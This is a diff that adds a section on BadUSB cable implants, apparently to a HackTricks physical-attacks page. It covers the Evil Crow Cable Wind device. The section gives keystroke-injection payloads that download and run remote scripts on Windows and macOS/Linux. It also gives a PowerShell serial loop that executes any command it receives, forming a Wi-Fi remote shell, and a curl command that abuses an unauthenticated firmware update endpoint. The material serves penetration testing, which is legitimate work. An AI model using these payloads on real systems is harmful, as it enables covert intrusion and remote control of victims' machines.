@@ -56,7 +56,42 @@ Devices like **Rubber Ducky** and **Teensyduino** serve as platforms for creatin
 
 Administrator privileges allow for the creation of copies of sensitive files, including the **SAM** file, through PowerShell.
 
----
+## BadUSB / HID Implant Techniques
+
+### Wi-Fi managed cable implants
+
+- ESP32-S3 based implants such as **Evil Crow Cable Wind** hide inside USB-A→USB-C or USB-C↔USB-C cables, enumerate purely as a USB keyboard, and expose their C2 stack over Wi-Fi. The operator only needs to power the cable from the victim host, create a hotspot named `Evil Crow Cable Wind` with password `123456789`, and browse to [http://cable-wind.local/](http://cable-wind.local/) (or its DHCP address) to reach the embedded HTTP interface.
+- The browser UI provides tabs for *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, and *Config*. Stored payloads are tagged per OS, keyboard layouts are switched on the fly, and VID/PID strings can be altered to mimic known peripherals.
+- Because the C2 lives inside the cable, a phone can stage payloads, trigger execution, and manage Wi-Fi credentials without touching the host OS—ideal for short dwell-time physical intrusions.
+
+### OS-aware AutoExec payloads
+
+- AutoExec rules bind one or more payloads to fire immediately after USB enumeration. The implant performs lightweight OS fingerprinting and selects the matching script.
+- Example workflow:
+  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
+  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
+- Because execution is unattended, simply swapping a charging cable can achieve “plug-and-pwn” initial access under the logged-on user context.
+
+### HID-bootstrapped remote shell over Wi-Fi TCP
+
+1. **Keystroke bootstrap:** A stored payload opens a console and pastes a loop that executes whatever arrives on the new USB serial device. A minimal Windows variant is:
+
+```powershell
+$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
+$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
+```
+
+2. **Cable bridge:** The implant keeps the USB CDC channel open while its ESP32-S3 launches a TCP client (Python script, Android APK, or desktop executable) back to the operator. Any bytes typed into the TCP session are forwarded into the serial loop above, giving remote command execution even on air-gapped hosts. Output is limited, so operators typically run blind commands (account creation, staging additional tooling, etc.).
+
+### HTTP OTA update surface
+
+- The same web stack usually exposes unauthenticated firmware updates. Evil Crow Cable Wind listens on `/update` and flashes whatever binary is uploaded:
+
+```bash
+curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
+```
+
+- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.
 
 ## Bypassing BitLocker Encryption
 
@@ -141,5 +176,6 @@ After the tenth cycle the EC sets a flag that instructs the BIOS to wipe NVRAM a
 - [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
 - [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
 - [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
+- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
 
 {{#include ../banners/hacktricks-training.md}}
